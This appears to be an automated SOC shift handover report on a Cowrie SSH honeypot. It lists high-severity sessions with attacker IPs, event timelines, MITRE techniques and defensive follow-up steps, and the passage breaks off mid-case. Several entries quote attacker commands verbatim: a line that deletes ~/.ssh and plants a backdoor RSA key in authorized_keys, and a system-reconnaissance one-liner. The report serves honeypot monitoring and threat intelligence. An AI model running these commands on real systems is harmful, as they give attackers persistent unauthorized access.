# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-14 |
| **Generated At** | 2026-03-14T20:26:13Z |
| **Shift Time** | 20:26 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **830** |
| Confirmed Threats | **113** |
| False Positives Filtered | **717** (86.4%) |
| Unique Attacker IPs | **212** |
| Countries of Origin | **23** |
| High Severity Cases | **94** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **736** |
| Malware Samples Analyzed | **0** HIGH · **1** MED · 0 empty upload attempt(s) |

---

## 🚨 Priority Cases — Immediate Attention (25)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5ffb86d5fbda

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-03-14 06:15 |
| **Last Seen** | 2026-03-14 06:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 06:15:05` | `cowrie.session.connect` |
| `2026-03-14 06:15:05` | `cowrie.client.version` |
| `2026-03-14 06:15:05` | `cowrie.client.kex` |
| `2026-03-14 06:15:06` | `cowrie.login.success` |
| `2026-03-14 06:15:07` | `cowrie.session.params` |
| `2026-03-14 06:15:07` | `cowrie.command.input` |
| `2026-03-14 06:15:07` | `cowrie.command.failed` |
| `2026-03-14 06:15:07` | `cowrie.log.closed` |
| `2026-03-14 06:15:08` | `cowrie.session.params` |
| `2026-03-14 06:15:08` | `cowrie.command.input` |
| `2026-03-14 06:15:08` | `cowrie.session.file_download` |
| `2026-03-14 06:15:08` | `cowrie.log.closed` |
| `2026-03-14 06:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-373471b4b6ee

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-03-14 06:15 |
| **Last Seen** | 2026-03-14 06:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 06:15:12` | `cowrie.session.connect` |
| `2026-03-14 06:15:12` | `cowrie.client.version` |
| `2026-03-14 06:15:12` | `cowrie.client.kex` |
| `2026-03-14 06:15:13` | `cowrie.login.success` |
| `2026-03-14 06:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d1602f5d0df

| Field | Detail |
|---|---|
| **Source IP** | `213.124.221[.]2` |
| **First Seen** | 2026-03-14 07:23 |
| **Last Seen** | 2026-03-14 07:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:23:23` | `cowrie.session.connect` |
| `2026-03-14 07:23:24` | `cowrie.client.version` |
| `2026-03-14 07:23:24` | `cowrie.client.kex` |
| `2026-03-14 07:23:24` | `cowrie.login.success` |
| `2026-03-14 07:23:25` | `cowrie.direct-tcpip.request` |
| `2026-03-14 07:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.124.221[.]2` to AbuseIPDB if not already reported
- [ ] Block `213.124.221[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f02b106208ae

| Field | Detail |
|---|---|
| **Source IP** | `134.199.151[.]94` |
| **First Seen** | 2026-03-14 07:34 |
| **Last Seen** | 2026-03-14 07:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:34:32` | `cowrie.session.connect` |
| `2026-03-14 07:34:32` | `cowrie.client.version` |
| `2026-03-14 07:34:32` | `cowrie.client.kex` |
| `2026-03-14 07:34:34` | `cowrie.login.success` |
| `2026-03-14 07:34:34` | `cowrie.session.params` |
| `2026-03-14 07:34:34` | `cowrie.command.input` |
| `2026-03-14 07:34:34` | `cowrie.command.input` |
| `2026-03-14 07:34:34` | `cowrie.command.input` |
| `2026-03-14 07:34:34` | `cowrie.command.input` |
| `2026-03-14 07:34:35` | `cowrie.log.closed` |
| `2026-03-14 07:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.199.151[.]94` to AbuseIPDB if not already reported
- [ ] Block `134.199.151[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8ed162c0bc1

| Field | Detail |
|---|---|
| **Source IP** | `134.199.151[.]94` |
| **First Seen** | 2026-03-14 07:35 |
| **Last Seen** | 2026-03-14 07:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:35:16` | `cowrie.session.connect` |
| `2026-03-14 07:35:16` | `cowrie.client.version` |
| `2026-03-14 07:35:16` | `cowrie.client.kex` |
| `2026-03-14 07:35:17` | `cowrie.login.success` |
| `2026-03-14 07:35:18` | `cowrie.session.params` |
| `2026-03-14 07:35:18` | `cowrie.command.input` |
| `2026-03-14 07:35:18` | `cowrie.command.input` |
| `2026-03-14 07:35:18` | `cowrie.command.input` |
| `2026-03-14 07:35:18` | `cowrie.command.input` |
| `2026-03-14 07:35:18` | `cowrie.log.closed` |
| `2026-03-14 07:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.199.151[.]94` to AbuseIPDB if not already reported
- [ ] Block `134.199.151[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58cc71ea1bb5

| Field | Detail |
|---|---|
| **Source IP** | `134.199.151[.]94` |
| **First Seen** | 2026-03-14 07:35 |
| **Last Seen** | 2026-03-14 07:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:35:59` | `cowrie.session.connect` |
| `2026-03-14 07:35:59` | `cowrie.client.version` |
| `2026-03-14 07:35:59` | `cowrie.client.kex` |
| `2026-03-14 07:36:03` | `cowrie.login.success` |
| `2026-03-14 07:36:03` | `cowrie.session.params` |
| `2026-03-14 07:36:03` | `cowrie.command.input` |
| `2026-03-14 07:36:03` | `cowrie.command.input` |
| `2026-03-14 07:36:03` | `cowrie.command.input` |
| `2026-03-14 07:36:03` | `cowrie.command.input` |
| `2026-03-14 07:36:03` | `cowrie.log.closed` |
| `2026-03-14 07:36:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.199.151[.]94` to AbuseIPDB if not already reported
- [ ] Block `134.199.151[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba1a9233804b

| Field | Detail |
|---|---|
| **Source IP** | `134.199.151[.]94` |
| **First Seen** | 2026-03-14 07:36 |
| **Last Seen** | 2026-03-14 07:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:36:47` | `cowrie.session.connect` |
| `2026-03-14 07:36:48` | `cowrie.client.version` |
| `2026-03-14 07:36:48` | `cowrie.client.kex` |
| `2026-03-14 07:36:49` | `cowrie.login.success` |
| `2026-03-14 07:36:50` | `cowrie.session.params` |
| `2026-03-14 07:36:50` | `cowrie.command.input` |
| `2026-03-14 07:36:50` | `cowrie.command.input` |
| `2026-03-14 07:36:50` | `cowrie.command.input` |
| `2026-03-14 07:36:50` | `cowrie.command.input` |
| `2026-03-14 07:36:50` | `cowrie.log.closed` |
| `2026-03-14 07:36:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.199.151[.]94` to AbuseIPDB if not already reported
- [ ] Block `134.199.151[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0871cd1968b

| Field | Detail |
|---|---|
| **Source IP** | `134.199.151[.]94` |
| **First Seen** | 2026-03-14 07:37 |
| **Last Seen** | 2026-03-14 07:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:37:31` | `cowrie.session.connect` |
| `2026-03-14 07:37:32` | `cowrie.client.version` |
| `2026-03-14 07:37:32` | `cowrie.client.kex` |
| `2026-03-14 07:37:33` | `cowrie.login.success` |
| `2026-03-14 07:37:34` | `cowrie.session.params` |
| `2026-03-14 07:37:34` | `cowrie.command.input` |
| `2026-03-14 07:37:34` | `cowrie.command.input` |
| `2026-03-14 07:37:34` | `cowrie.command.input` |
| `2026-03-14 07:37:34` | `cowrie.command.input` |
| `2026-03-14 07:37:34` | `cowrie.log.closed` |
| `2026-03-14 07:37:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.199.151[.]94` to AbuseIPDB if not already reported
- [ ] Block `134.199.151[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5e00da4f111

| Field | Detail |
|---|---|
| **Source IP** | `134.199.151[.]94` |
| **First Seen** | 2026-03-14 07:38 |
| **Last Seen** | 2026-03-14 07:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:38:17` | `cowrie.session.connect` |
| `2026-03-14 07:38:17` | `cowrie.client.version` |
| `2026-03-14 07:38:18` | `cowrie.client.kex` |
| `2026-03-14 07:38:18` | `cowrie.login.success` |
| `2026-03-14 07:38:19` | `cowrie.session.params` |
| `2026-03-14 07:38:19` | `cowrie.command.input` |
| `2026-03-14 07:38:19` | `cowrie.command.input` |
| `2026-03-14 07:38:19` | `cowrie.command.input` |
| `2026-03-14 07:38:19` | `cowrie.command.input` |
| `2026-03-14 07:38:19` | `cowrie.log.closed` |
| `2026-03-14 07:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.199.151[.]94` to AbuseIPDB if not already reported
- [ ] Block `134.199.151[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c69265684d32

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:14 |
| **Last Seen** | 2026-03-14 09:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:14:08` | `cowrie.session.connect` |
| `2026-03-14 09:14:08` | `cowrie.client.version` |
| `2026-03-14 09:14:08` | `cowrie.client.kex` |
| `2026-03-14 09:14:09` | `cowrie.login.success` |
| `2026-03-14 09:14:10` | `cowrie.session.params` |
| `2026-03-14 09:14:10` | `cowrie.command.input` |
| `2026-03-14 09:14:10` | `cowrie.command.failed` |
| `2026-03-14 09:14:10` | `cowrie.log.closed` |
| `2026-03-14 09:14:10` | `cowrie.session.params` |
| `2026-03-14 09:14:10` | `cowrie.command.input` |
| `2026-03-14 09:14:11` | `cowrie.session.file_download` |
| `2026-03-14 09:14:11` | `cowrie.log.closed` |
| `2026-03-14 09:14:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8354a47aabfe

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:14 |
| **Last Seen** | 2026-03-14 09:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:14:13` | `cowrie.session.connect` |
| `2026-03-14 09:14:13` | `cowrie.client.version` |
| `2026-03-14 09:14:14` | `cowrie.client.kex` |
| `2026-03-14 09:14:15` | `cowrie.login.success` |
| `2026-03-14 09:14:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f386172b300

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:16 |
| **Last Seen** | 2026-03-14 09:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:16:50` | `cowrie.session.connect` |
| `2026-03-14 09:16:50` | `cowrie.client.version` |
| `2026-03-14 09:16:50` | `cowrie.client.kex` |
| `2026-03-14 09:16:51` | `cowrie.login.success` |
| `2026-03-14 09:16:51` | `cowrie.session.params` |
| `2026-03-14 09:16:51` | `cowrie.command.input` |
| `2026-03-14 09:16:51` | `cowrie.command.failed` |
| `2026-03-14 09:16:52` | `cowrie.log.closed` |
| `2026-03-14 09:16:52` | `cowrie.session.params` |
| `2026-03-14 09:16:52` | `cowrie.command.input` |
| `2026-03-14 09:16:52` | `cowrie.session.file_download` |
| `2026-03-14 09:16:52` | `cowrie.log.closed` |
| `2026-03-14 09:16:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4ec9ea7c27c

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:16 |
| **Last Seen** | 2026-03-14 09:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:16:55` | `cowrie.session.connect` |
| `2026-03-14 09:16:55` | `cowrie.client.version` |
| `2026-03-14 09:16:55` | `cowrie.client.kex` |
| `2026-03-14 09:16:56` | `cowrie.login.success` |
| `2026-03-14 09:16:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93c10091cfdd

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:27 |
| **Last Seen** | 2026-03-14 09:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:27:00` | `cowrie.session.connect` |
| `2026-03-14 09:27:00` | `cowrie.client.version` |
| `2026-03-14 09:27:01` | `cowrie.client.kex` |
| `2026-03-14 09:27:02` | `cowrie.login.success` |
| `2026-03-14 09:27:02` | `cowrie.session.params` |
| `2026-03-14 09:27:02` | `cowrie.command.input` |
| `2026-03-14 09:27:02` | `cowrie.command.failed` |
| `2026-03-14 09:27:02` | `cowrie.log.closed` |
| `2026-03-14 09:27:03` | `cowrie.session.params` |
| `2026-03-14 09:27:03` | `cowrie.command.input` |
| `2026-03-14 09:27:03` | `cowrie.session.file_download` |
| `2026-03-14 09:27:03` | `cowrie.log.closed` |
| `2026-03-14 09:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f16594d493b

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:27 |
| **Last Seen** | 2026-03-14 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:27:06` | `cowrie.session.connect` |
| `2026-03-14 09:27:06` | `cowrie.client.version` |
| `2026-03-14 09:27:06` | `cowrie.client.kex` |
| `2026-03-14 09:27:07` | `cowrie.login.success` |
| `2026-03-14 09:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e5e0b298eef

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:29 |
| **Last Seen** | 2026-03-14 09:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
